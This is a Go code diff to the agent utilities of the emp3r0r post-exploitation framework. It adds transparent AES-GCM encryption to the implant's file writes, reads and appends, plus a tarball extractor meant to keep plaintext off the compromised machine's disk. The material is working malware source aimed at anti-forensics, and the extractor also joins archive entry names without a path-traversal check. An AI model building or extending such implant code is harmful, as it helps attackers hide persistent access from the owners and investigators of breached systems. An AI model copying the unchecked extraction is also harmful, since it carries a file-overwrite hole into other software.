@@ -1,15 +1,19 @@
 package util
 
 import (
+	"archive/tar"
 	"bufio"
 	"bytes"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 
 	"github.com/fxamacker/cbor/v2"
+	"github.com/jm33-m0/arc/v2"
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 )
 
@@ -513,6 +517,14 @@ func copyDirAgent(src, dst string) error {
 	})
 }
 
+// SetFileCryptoKey sets the key for file encryption
+var fileCryptoKey []byte
+
+// SetFileCryptoKey sets the key for file encryption
+func SetFileCryptoKey(key []byte) {
+	fileCryptoKey = key
+}
+
 // WriteFileAgent is a centralized file writing function for agent operations.
 // This function wraps all file writing operations to allow for future modifications
 // such as encryption, steganography, or other security enhancements.
@@ -520,12 +532,14 @@ func WriteFileAgent(filename string, data []byte, perm os.FileMode) error {
 	// Apply pattern
 	filename = ApplyFilePattern(filename)
 
-	// Future enhancements can be added here:
-	// - File encryption before writing
-	// - Steganography to hide files
-	// - Anti-forensics techniques
-	// - Atomic writes with temporary files
-	// - Logging for debugging (but be careful with OpSec)
+	// File encryption before writing
+	if len(fileCryptoKey) > 0 {
+		var err error
+		data, err = crypto.AES_GCM_Encrypt(fileCryptoKey, data)
+		if err != nil {
+			return fmt.Errorf("WriteFileAgent encrypt: %v", err)
+		}
+	}
 
 	logging.Debugf("Agent: Writing %d bytes to %s with permissions %o", len(data), filename, perm)
 
@@ -538,8 +552,35 @@ func WriteFileAgent(filename string, data []byte, perm os.FileMode) error {
 	return os.WriteFile(filename, data, perm)
 }
 
+// ReadFileAgent reads a file from the agent's filesystem
+func ReadFileAgent(filename string) ([]byte, error) {
+	// Apply pattern
+	filename = ApplyFilePattern(filename)
+
+	logging.Debugf("Agent: Reading file %s", filename)
+
+	data, err := os.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+
+	// File decryption after reading
+	if len(fileCryptoKey) > 0 {
+		decrypted, err := crypto.AES_GCM_Decrypt(fileCryptoKey, data)
+		if err != nil {
+			logging.Debugf("ReadFileAgent decrypt %s: %v, returning raw data", filename, err)
+			return data, nil // fallback to raw data for backward compatibility or non-encrypted files
+		}
+		data = decrypted
+	}
+
+	return data, nil
+}
+
 // CreateFileAgent is a centralized file creation function for agent operations.
 // This function wraps file creation operations to allow for future modifications.
+// Note: CreateFileAgent returns a raw os.File, so it DOES NOT support transparent encryption.
+// Use WriteFileAgent for encryption.
 func CreateFileAgent(filename string) (*os.File, error) {
 	// Apply pattern
 	filename = ApplyFilePattern(filename)
@@ -561,6 +602,8 @@ func CreateFileAgent(filename string) (*os.File, error) {
 
 // OpenFileAgent is a centralized file opening function for agent operations.
 // This function wraps file opening operations to allow for future modifications.
+// Note: OpenFileAgent returns a raw os.File, so it DOES NOT support transparent encryption.
+// Use ReadFileAgent for encryption.
 func OpenFileAgent(filename string, flag int, perm os.FileMode) (*os.File, error) {
 	// Apply pattern
 	filename = ApplyFilePattern(filename)
@@ -588,9 +631,17 @@ func OpenFileAgent(filename string, flag int, perm os.FileMode) (*os.File, error
 func AppendToFileAgent(filename string, data []byte) error {
 	logging.Debugf("Agent: Appending %d bytes to %s", len(data), filename)
 
-	// Future enhancements can be added here:
-	// - Encryption before appending
-	// - Anti-forensics techniques
+	if len(fileCryptoKey) > 0 {
+		// Read, decrypt, append, encrypt, write
+		existing, err := ReadFileAgent(filename)
+		if err != nil && !os.IsNotExist(err) {
+			return fmt.Errorf("AppendToFileAgent read: %v", err)
+		}
+		// if os.IsNotExist, existing is nil/empty
+
+		newData := append(existing, data...)
+		return WriteFileAgent(filename, newData, 0o600)
+	}
 
 	f, err := OpenFileAgent(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
 	if err != nil {
@@ -607,20 +658,56 @@ func AppendToFileAgent(filename string, data []byte) error {
 // AppendTextToFileAgent is a centralized text appending function for agent operations.
 // This function wraps text appending operations to allow for future modifications.
 func AppendTextToFileAgent(filename string, text string) error {
-	logging.Debugf("Agent: Appending text to %s", filename)
+	return AppendToFileAgent(filename, []byte(text))
+}
 
-	// Future enhancements can be added here:
-	// - Encryption before appending
-	// - Anti-forensics techniques
-
-	f, err := OpenFileAgent(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
+// UnarchiveAgent unarchives a tarball (which might be encrypted) to a directory
+// It ensures that extracted files are also written using WriteFileAgent (blocking plaintext on disk)
+func UnarchiveAgent(tarball, dst string) error {
+	// 1. Read (and decrypt) tarball
+	data, err := ReadFileAgent(tarball)
 	if err != nil {
-		return err
+		return fmt.Errorf("read tarball: %v", err)
 	}
-	defer f.Close()
 
-	if _, err = f.WriteString(text); err != nil {
-		return err
+	// 2. Decompress XZ (using arc library)
+	tarData, err := arc.DecompressXz(data)
+	if err != nil {
+		return fmt.Errorf("decompress xz: %v", err)
+	}
+
+	// 3. Untar to dst using WriteFileAgent
+	tr := tar.NewReader(bytes.NewReader(tarData))
+	for {
+		header, err := tr.Next()
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return fmt.Errorf("next tar header: %v", err)
+		}
+
+		targetPath := filepath.Join(dst, header.Name)
+		info := header.FileInfo()
+
+		switch header.Typeflag {
+		case tar.TypeDir:
+			if err = os.MkdirAll(targetPath, info.Mode()); err != nil {
+				return err
+			}
+		case tar.TypeReg:
+			// Read content
+			content, err := io.ReadAll(tr)
+			if err != nil {
+				return fmt.Errorf("read tar content: %v", err)
+			}
+			// Write with encryption
+			if err = WriteFileAgent(targetPath, content, info.Mode()); err != nil {
+				return err
+			}
+		default:
+			logging.Debugf("UnarchiveAgent: skipping unknown type %c for %s", header.Typeflag, header.Name)
+		}
 	}
 	return nil
 }
